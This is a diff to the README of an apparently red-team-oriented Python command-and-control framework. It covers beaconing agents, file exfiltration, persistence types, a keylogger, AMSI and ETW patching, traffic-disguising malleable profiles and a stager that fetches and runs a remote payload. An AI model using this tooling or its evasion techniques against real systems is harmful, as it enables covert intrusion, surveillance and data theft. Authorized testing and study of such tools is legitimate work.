@@ -1,11 +1,9 @@
-# c2 — Python C2 Framework
+# Python C2 Framework
 
 A complete Command & Control framework written from scratch in Python.
 Multi-transport (TCP / HTTP / HTTPS), end-to-end encrypted, multi-operator
 with role-based access control, plugin-style post-exploitation modules,
 agent staging, and SQLite persistence.
-
----
 
 > ## ⚠️ LEGAL DISCLAIMER
 >
@@ -13,11 +11,11 @@ agent staging, and SQLite persistence.
 > engagements, CTF competitions, and educational use in controlled lab
 > environments only**.
 >
-> You must have **explicit, written permission** from the owner of any system
-> you test with this software. Unauthorized access to computer systems is
-> illegal under laws including (but not limited to) the U.S. Computer Fraud
-> and Abuse Act (CFAA), the UK Computer Misuse Act, and the EU Directive on
-> Attacks Against Information Systems.
+> You must have **explicit, written permission** from the owner of any
+> system you test with this software. Unauthorized access to computer
+> systems is illegal under laws including (but not limited to) the U.S.
+> Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and the
+> EU Directive on Attacks Against Information Systems.
 >
 > The author(s) accept **no liability** for misuse, damage, or legal
 > consequences arising from the use of this code. **You are solely
@@ -57,7 +55,11 @@ agent staging, and SQLite persistence.
 - **Three transports** — raw TCP, HTTP, and HTTPS (auto-generated self-signed TLS cert)
 - **Beaconing with jitter** — configurable interval and randomized sleep (±30% by default)
 - **Length-prefixed framing** — reliable delivery of large payloads over raw sockets
-- **Automatic reconnection** — agents retry with backoff when the server is unreachable
+- **Automatic reconnection with exponential backoff** — agents retry when the
+  server is unreachable, backing off from 10s up to 300s
+- **Stable agent identity across reconnects** — each machine is assigned a
+  persistent `machine_id`; reconnecting agents keep the same agent ID in the
+  operator's `list`, so task history isn't fragmented
 
 ### Cryptography
 - **RSA-2048 OAEP** key exchange on registration
@@ -70,6 +72,8 @@ agent staging, and SQLite persistence.
 - **Role-based access control** — `admin`, `operator`, `viewer`
 - **SQLite backend** — agents, tasks, results, operators, profiles, and loot all persisted
 - **Multi-operator support** — several red teamers can drive the same server simultaneously
+- **Automatic offline detection** — agents that miss beacons for 5 minutes are
+  marked `dead` (works for TCP, HTTP, and HTTPS transports alike)
 
 ### Post-Exploitation
 - Shell command execution
@@ -79,7 +83,7 @@ agent staging, and SQLite persistence.
 - Screenshot capture
 - Privilege escalation enumeration (Linux + Windows)
 - Windows AMSI bypass (patches `AmsiScanBuffer`)
-- Windows ETW patching (patches `EtwEventWrite`)
+- Windows ETW patching (patches `EtwEventWrite`, 32-bit and 64-bit safe)
 - Keylogger (start / dump / stop)
 
 ### Evasion & OPSEC
@@ -140,15 +144,13 @@ agent staging, and SQLite persistence.
 ## Installation
 
 ```bash
-# Clone or extract the project into a directory
-cd c2/
+git clone <this-repo>
+cd Python-C2-Framework
 
-# (Recommended) create a virtual environment
 python -m venv venv
 source venv/bin/activate          # Linux/macOS
 venv\Scripts\activate              # Windows
 
-# Install dependencies
 pip install -r requirements.txt
 ```
 
@@ -240,6 +242,16 @@ python agent.py --transport http --url http://<SERVER_IP>:8080 --pubkey /path/to
 The agent prints its `agent_id` when registration succeeds. The server
 prints the same ID when it receives the registration.
 
+#### Reconnect behavior
+
+If the agent loses its connection, it retries with exponential backoff
+(10s → 20s → 40s ... up to 300s). On successful reconnect, the agent
+keeps its **same agent ID** (matched via a persistent `machine_id` that
+is a hash of the target's hostname, MAC, and architecture). This means
+your `use <id>` selection, task history, and loot filenames remain
+stable across reconnects. If the target's hostname or MAC changes (e.g.,
+new NIC, VM cloned), it will appear as a new agent.
+
 #### Agent CLI options
 
 | Flag | Description |
@@ -269,29 +281,32 @@ Commands:
   env                                  Environment variables
   download <remote_path>               Exfil file (saved to loot/)
   upload <local_path> <remote_path>    Push file
-  persist <type>                       persistence (cron|rc|systemd|registry|launchagent|startup|schtask)
+  persist <type>                       cron|rc|systemd|registry|schtask|startup|launchagent
   screenshot                           Capture screenshot
   privesc                              Enumerate privilege escalation vectors
   amsi                                 Windows AMSI bypass
   etw                                  Windows ETW patch
   keylog_start | keylog_dump | keylog_stop
   results                              Show results for selected agent
-  list_operators | add_operator <u> <p> <role> | remove_operator <u>
-  list_profiles | add_profile ...
+  list_operators                       List operators (admin)
+  add_operator <u> <p> <role>          Add operator   (admin)
+  remove_operator <u>                  Remove operator(admin)
+  list_profiles                        List malleable profiles
+  add_profile <path.json>              Add profile from JSON (admin)
+  help                                 Show this
   exit                                 Shutdown server
 ```
 
 Every command that touches an agent is **queued** and delivered on the
 agent's **next beacon**. Results arrive on the beacon that follows task
-delivery. This is the beacon/task model — nothing is sent to an agent
-out-of-band.
+delivery. Nothing is pushed out-of-band.
 
 ---
 
 ### 4. Remote Operators
 
 The operator port (5555) lets other machines control the teamserver with
-proper authentication and role-based access control.
+authentication and role-based access control.
 
 ```bash
 python operator.py <SERVER_IP> 5555
@@ -318,12 +333,15 @@ from the server's `/stage` endpoint and runs it. This bypasses size-based
 file detection and lets you update the agent without re-deploying.
 
 ```bash
-# On the target machine
+# Place the payload on the server next to server.py:
+cp agent.py agent_payload.py     # (on the server)
+
+# On the target machine:
 python stager.py http://<SERVER_IP>:8080 --transport http --url http://<SERVER_IP>:8080
 ```
 
-To serve a custom agent payload, place it on the server as
-`agent_payload.py` next to `server.py`.
+The stager warns you if it can't find `server_public.pem` in the
+current directory, because the agent will fail to register without it.
 
 ---
 
@@ -345,16 +363,16 @@ agent's next beacon.
 | Command | Description |
 |---|---|
 | `shell <cmd>` | Execute a shell command |
-| `sysinfo` | Return hostname, user, OS, arch, PID |
+| `sysinfo` | Return hostname, user, OS, arch, PID, machine_id |
 | `ps` | List running processes (`tasklist` / `ps aux`) |
 | `env` | Dump environment variables |
 | `download <remote>` | Exfiltrate a file (auto-saved to `loot/`) |
 | `upload <local> <remote>` | Push a file to the agent |
-| `persist <kind>` | Install persistence |
+| `persist <kind>` | Install persistence (see table below) |
 | `screenshot` | Capture the screen (PNG, base64) |
 | `privesc` | Enumerate privilege escalation vectors |
 | `amsi` | Patch `AmsiScanBuffer` (Windows only) |
-| `etw` | Patch `EtwEventWrite` (Windows only) |
+| `etw` | Patch `EtwEventWrite` (Windows only, 32/64-bit safe) |
 | `keylog_start` / `keylog_dump` / `keylog_stop` | Control the keylogger |
 | `results` | Show recent results for the selected agent |
 
@@ -371,7 +389,7 @@ agent's next beacon.
 | Command | Description |
 |---|---|
 | `list_profiles` | Show all malleable profiles |
-| `add_profile ...` | Register a new profile (see below) |
+| `add_profile <path.json>` | Register a new profile from a JSON file |
 
 ---
 
@@ -419,7 +437,8 @@ Agent                                    Server
   │ ────── encrypted registration ───────▶ │
   │                                        │  4. RSA decrypt → extract
   │                                        │     session_key + info
-  │                                        │  5. Store agent record
+  │                                        │  5. Match on machine_id or
+  │                                        │     create new agent record
   │ ◀──── AES-GCM({status, agent_id}) ──── │  6. Reply with agent_id
   │                                        │     (encrypted with session_key)
 ```
@@ -467,38 +486,53 @@ in the `operators` table — never in plaintext.
 ## Malleable Profiles
 
 A malleable profile controls the HTTP request shape the agent uses, so
-it blends into normal web traffic. Register profiles from the operator
-console (admin only) or insert them directly in the SQLite `profiles`
-table.
+it blends into normal web traffic. Register profiles from either console
+(admin only) by pointing at a JSON file.
 
-### Default profile (built-in)
+### Example profile file (`myprofile.json`)
 
 ```json
 {
-  "name": "default",
+  "name": "cloudflare_cdn",
   "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-  "register_uri": "/api/v1/auth/login",
-  "beacon_uri": "/api/v1/auth/refresh",
-  "result_uri": "/api/v1/auth/verify",
+  "register_uri": "/cdn-cgi/trace/auth",
+  "beacon_uri": "/cdn-cgi/trace/refresh",
+  "result_uri": "/cdn-cgi/trace/log",
   "headers": {
-    "Accept": "application/json, text/plain, */*",
-    "Accept-Language": "en-US,en;q=0.9",
-    "X-Requested-With": "XMLHttpRequest"
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "X-Forwarded-For": "127.0.0.1"
   }
 }
 ```
 
-### Using a custom profile from the agent
+### Registering it
 
-Save a profile as `myprofile.json` on the target and pass it:
+On the server console:
+
+```
+[c2:none] > add_profile /path/to/myprofile.json
+```
+
+From a remote operator:
+
+```
+[admin:none] > add_profile /path/to/myprofile.json
+```
+
+The `path` is resolved **on the server** — so the file has to be
+readable by the server process, not the operator's machine.
+
+### Using it from the agent
+
+Pass the profile to the agent at startup:
 
 ```bash
 python agent.py --transport http --url http://<SERVER_IP>:8080 --profile myprofile.json
 ```
 
-The server must know about the URIs in the profile — add them first
-with `add_profile`, or update `common.DEFAULT_PROFILE` before starting
-the server.
+The server must already know about the URIs in the profile (via
+`add_profile`) — otherwise requests to those URIs return 404.
 
 ---
 
@@ -517,7 +551,8 @@ Runs `cmd` and returns `stdout + stderr`.
 
 ### `sysinfo`
 
-Returns JSON with `hostname`, `user`, `os`, `os_version`, `arch`, `pid`.
+Returns JSON with `hostname`, `user`, `os`, `os_version`, `arch`, `pid`,
+and `machine_id`.
 
 ### `ps`
 
@@ -566,8 +601,10 @@ all AMSI scans return `E_INVALIDARG` (which most .NET hosts treat as
 
 ### `etw` (Windows only)
 
-Patches `ntdll.dll!EtwEventWrite` with `xor rax, rax; ret`, disabling
-ETW events produced by .NET assemblies.
+Patches `ntdll.dll!EtwEventWrite` with `xor rax, rax; ret` on 64-bit or
+`xor eax, eax; ret` on 32-bit, disabling ETW events produced by .NET
+assemblies. The correct patch is selected automatically based on the
+Python interpreter's bitness.
 
 ### `keylog_start` / `keylog_dump` / `keylog_stop`
 
@@ -579,7 +616,7 @@ Uses `pynput.keyboard.Listener`. Logs to a random `tempfile` path; the
 ## Project Layout
 
 ```
-c2/
+Python-C2-Framework/
 ├── README.md            ← this file
 ├── requirements.txt     ← Python dependencies
 ├── common.py            ← shared crypto, framing, default profile
@@ -622,7 +659,10 @@ loot/4f1a9c2b_secret.txt
 
 The operator runs `upload <local_path> <remote_path>`. The server reads
 the local file, base64-encodes it into the task, and the agent writes
-it to `<remote_path>` on the target.
+it to `<remote_path>` on the target. The local path is resolved on the
+**operator** machine — if you're a remote operator, that means your
+machine, and the file content is shipped to the server over the operator
+connection.
 
 ### Results
 
@@ -647,8 +687,7 @@ The operator port expects a login message first. Run `operator.py`
    changed.
 2. Confirm the target can reach the chosen port
    (`nc -zv <SERVER_IP> 8080`).
-3. Check the server's stdout — registration failures print to the
-   console.
+3. Check the server's stdout — registration failures print to the console.
 
 ### `http 401` on beacon or result
 
@@ -656,7 +695,7 @@ The `X-Agent-Id` header is missing or unknown. Ensure the agent's
 `agent_id` matches a row in the `agents` table:
 
 ```sql
-SELECT id, hostname, connected FROM agents;
+SELECT id, machine_id, hostname, connected FROM agents;
 ```
 
 ### HTTPS agent fails TLS verification
@@ -685,16 +724,27 @@ On Linux, `pynput` also needs an X server. On headless servers, use a
 different `on_press` handler (e.g., log to file from the agent's own
 process).
 
-### Agent keeps reconnecting every 10 seconds
+### Agents show "dead" too quickly / too slowly
 
-That's the `RECONNECT_DELAY` in `agent.py`. The server's beaconing
-interval is `BEACON_INTERVAL = 5` with ±30% jitter. Tune both constants
-at the top of `agent.py` for your environment.
+The watchdog marks agents offline after `BEACON_TIMEOUT = 300` seconds
+(5 minutes) without a beacon. Change this constant at the top of
+`server.py` if you need a different threshold. The agent-side beacon
+interval is `BEACON_INTERVAL = 5` seconds (with ±30% jitter) — change
+this at the top of `agent.py`.
+
+### Same target appears twice in `list`
+
+The `machine_id` hash is `sha256(hostname|mac|arch)`. If any of those
+change (VM cloned, NIC swapped, hostname renamed), the server treats it
+as a new agent. You can merge duplicates manually with SQL or accept
+it as expected behaviour for cloned VMs.
 
 ### Looted file is truncated or corrupt
 
-The base64 transport limits practical file size to a few MB. For large
-files, extend the download module to chunk over multiple beacons.
+Base64 payloads are carried in a single JSON blob. For very large files
+(hundreds of MB), the encrypted payloads get unwieldy. The framework
+works reliably up to a few MB; beyond that, chunk the download across
+multiple tasks.
 
 ---
 
@@ -706,7 +756,6 @@ files, extend the download module to chunk over multiple beacons.
 
    ```python
    def _my_module(args):
-       # args is the dict sent by the operator
        return "result string"
    ```
 
@@ -723,9 +772,9 @@ files, extend the download module to chunk over multiple beacons.
        ...
    ```
 
-4. In `operator.py` and the local console, add a command that builds
-   the correct `cmd` dict (or rely on the generic dispatch if the
-   operator's CLI already supports arbitrary commands).
+4. Add a `parse_line()` branch in `server.py` and `operator.py` so it
+   builds the right cmd dict (unless you only need the default
+   `{"cmd": "my_module"}` payload).
 
 ### Add a new transport
 
